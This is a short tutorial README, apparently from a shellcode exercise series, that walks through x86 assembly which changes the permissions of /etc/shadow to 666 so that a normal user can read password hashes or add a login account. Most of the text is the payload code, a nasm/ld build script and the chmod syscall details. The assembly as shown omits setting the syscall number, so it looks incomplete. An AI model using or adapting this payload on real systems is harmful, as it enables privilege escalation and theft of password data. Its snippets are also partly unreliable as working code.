# chmod_shadow
The code changes the permissions of the /etc/shadow file to o666, so it will be readable and writable for the normal user. This way we can read the password or add an user to login.  
  
To do this, we are using the chmod() syscal, which can be found on the man page. The function has only 2 parameters, one for the filename and one for the file mode.    
```C++
int chmod(const char *pathname, mode_t mode);
```

First we need to push the string '//etc/shadow' to the stack, for the first parameter to use it.  
Like so:  
```asm
xor edx, edx
push edx                ; string terminator

; //etc/shadow
push 0x776f6461
push 0x68732f63
push 0x74652f2f
mov ebx, esp            ; get the string from the stack
```
  
Now we just simply set the second parameter, o666 is a number that has no zero's, so that comes conveniently!
```asm
mov cx, 0666o           ; 666 mode
int 0x80
``` 

Now we compile the code, I created a small bash script for that, so we can be faster with it.  
```bash
# compile.sh
nasm -f elf chmod_shadow.asm && ld -o chmod_shadow chmod_shadow.o -m elf_i386 && strace ./chmod_shadow
``` 
  
We just simply call ./compile.sh  
  
I'm not gonna explain the tests, because I already explained it a few dozen times in the other projects.
